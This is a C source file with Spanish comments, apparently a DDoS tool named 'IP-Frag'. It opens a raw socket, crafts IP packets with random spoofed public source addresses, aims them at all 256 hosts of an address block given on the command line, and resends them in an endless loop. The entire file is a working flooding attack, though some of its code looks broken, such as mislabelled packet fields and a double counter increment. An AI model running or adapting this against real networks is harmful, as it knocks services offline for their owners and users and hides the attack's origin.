#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <signal.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#define MAX_IPS 9999999   // Capacidad máxima de nuestro array
int ipsend(u_int saddr, u_int daddr, unsigned short proto,
                 unsigned short off, char *data,
                 unsigned short datalen);
unsigned short in_cksum(unsigned short *ptr, int nbytes);
int sockfd;
struct paquetes{
        char* packet;
        unsigned short packet_size;
        unsigned long daddr;
        sockaddr_in sock;
        unsigned short sockaddr_in_size;
};
uint8_t rand_range(uint8_t min, uint8_t max) {
    return min + rand() % (max - min + 1);
}

// Función que genera una IP pública válida en formato de red (uint32_t)
uint32_t generar_ip_publica_aleatoria() {
    uint8_t o1, o2, o3, o4;

    while (1) {
        o1 = rand_range(1, 254);
        o2 = rand_range(0, 255);
        o3 = rand_range(0, 255);
        o4 = rand_range(1, 254); // Evitamos .0 y .255 en el último octeto por convención de red

        // --- FILTROS DE RANGOS PRIVADOS Y RESERVADOS ---

        // Localhost / Loopback (127.0.0.0/8)
        if (o1 == 127) continue;

        // IPs Privadas (Clase A: 10.0.0.0/8)
        if (o1 == 10) continue;

        // IPs Privadas (Clase B: 172.16.0.0/12)
        if (o1 == 172 && (o2 >= 16 && o2 <= 31)) continue;

        // IPs Privadas (Clase C: 192.168.0.0/16)
        if (o1 == 192 && o2 == 168) continue;

        // Enlace Local / APIPA (169.254.0.0/16)
        if (o1 == 169 && o2 == 254) continue;

        // Multicast (Clase D: 224.0.0.0 a 239.255.255.255)
        if (o1 >= 224 && o1 <= 239) continue;

        // Reservado para investigaciones (Clase E: 240.0.0.0 a 255.255.255.255)
        if (o1 >= 240) continue;

        // Redes de Benchmarking (198.18.0.0/15)
        if (o1 == 198 && (o2 == 18 || o2 == 19)) continue;

        // CGNAT / Carrier-Grade NAT (100.64.0.0/10)
        if (o1 == 100 && (o2 >= 64 && o2 <= 127)) continue;

        // Si pasó todos los filtros, es una IP pública válida
        break;
    }

    // Construir la IP en formato de 32 bits (Big-Endian)
    uint32_t ip_en_red = (o1 << 24) | (o2 << 16) | (o3 << 8) | o4;
    return htonl(ip_en_red);
}
unsigned int ALAN=0;
paquetes CASALAN[MAX_IPS];
#define PHI 0xaaf219b9
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
  }
}

uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782LL;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}


void generate_random_payload(char *buf, int size) {
    // Usamos caracteres legibles (letras y números) para que se vea limpio en Wireshark
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < size; i++) {
        buf[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}
int main(int argc, char **argv){
if (argc < 2) {
        printf("Uso correcto: %s <base_ip>\n", argv[0]);
        printf("Ejemplo: %s 45.5.148\n", argv[0]);
        return 1; // Terminar el programa con código de error
    }
char *mi_red = argv[1];
init_rand(time(NULL));
        int on = 1;
        sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
        setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on));
        unsigned short srcp;
        unsigned short dstp;
printf("# IP-Frag by Alan Sardon\n");
//Computize Packets
unsigned long A;
char ip_buffer[16];
char payload[56];
int i=0;
for(i=0;i<256;i++){
srcp=rand_cmwc() % 65534+1;
dstp=rand_cmwc() % 65534+1;
snprintf(ip_buffer, sizeof(ip_buffer), "%s.%d",mi_red, i);
generate_random_payload(payload,55); //eleji el PAY load size a gusto
ipsend(generar_ip_publica_aleatoria(),inet_addr(ip_buffer),srcp,dstp,payload,sizeof(payload));
ALAN++;
}
//Ya estan los paquetesd calculaDDoS
printf("A MITIG.AR\n");
while(true){
for(A=0;A<ALAN;A++){
sendto(sockfd, CASALAN[A].packet, CASALAN[A].packet_size, 0, (const sockaddr*) &CASALAN[A].sock,CASALAN[A].sockaddr_in_size);
}
}
return 0;
}

int ipsend (unsigned int saddr, unsigned int daddr, unsigned short proto,unsigned short off, char *data, unsigned short datalen){
        char *packet;
        struct iphdr *ip;
        struct sockaddr_in servaddr;
        int retval;
        int on = 1;
        int packet_size = (sizeof (struct iphdr) +
                                    datalen) * sizeof (char);

        packet = (char *) malloc (packet_size);

        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons (0);
        servaddr.sin_addr.s_addr = daddr;
        memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));

        ip = (struct iphdr *) packet;
        memset (packet, 0, packet_size);

    if (data && datalen > 0) {
        memcpy(packet + sizeof(struct iphdr), data, datalen);
    }

        ip->version = 4;
        ip->ihl = 5;
        ip->tot_len = htons (packet_size);
        ip->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        ip->ttl = 255;
        ip->tos = 16;
        ip->frag_off = off;
        ip->protocol = proto;
        ip->saddr = saddr;
        ip->daddr = daddr;
        ip->check = in_cksum ((unsigned short *) ip, sizeof (struct iphdr));
CASALAN[ALAN].packet=packet;
CASALAN[ALAN].packet_size=packet_size;
CASALAN[ALAN].sock=servaddr;
CASALAN[ALAN].sockaddr_in_size=sizeof(servaddr);
//      sendto (sockfd, packet, packet_size, 0, (const sockaddr*) &servaddr, sizeof (servaddr));
ALAN++;
        return 0;
}

unsigned short in_cksum (unsigned short *ptr, int nbytes){
        register long sum;
        u_short oddbyte;
        register u_short answer;
        sum = 0;
        while (nbytes > 1) {
                sum += *ptr++;
                nbytes -= 2;
        }
        if (nbytes == 1) {
                oddbyte = 0;
                *((u_char *) & oddbyte) = *(u_char *) ptr;
                sum += oddbyte;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;

        return (answer);
}
